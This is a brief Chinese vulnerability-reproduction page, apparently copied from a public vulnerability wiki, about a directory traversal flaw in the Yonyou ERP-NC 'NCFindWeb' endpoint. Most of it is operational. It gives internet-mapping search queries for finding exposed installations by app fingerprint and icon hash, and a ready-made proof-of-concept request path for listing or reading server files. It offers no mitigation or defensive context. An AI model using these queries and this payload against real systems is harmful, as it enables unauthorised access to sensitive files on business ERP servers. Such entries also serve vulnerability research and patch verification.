---
title: "用友 ERP-NC NCFindWeb 目录遍历漏洞"
date: 2026-10-17 09:12:50
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "用友"
tags:
  - "用友"
  - "目录遍历"
  - "漏洞复现"
---
## 漏洞描述

用友 ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息。

## 漏洞影响

```
用友 ERP-NC
```

## 网络测绘

```
app="用友-UFIDA-NC"
# or
icon_hash="1085941792"
```

## 漏洞复现

poc

```plain
/NCFindWeb?service=IPreAlertConfigService&filename=
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/%E7%94%A8%E5%8F%8B-ERP-NC-NCFindWeb-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/image-20240704143115260.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E7%94%A8%E5%8F%8B-ERP-NC-NCFindWeb-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md)
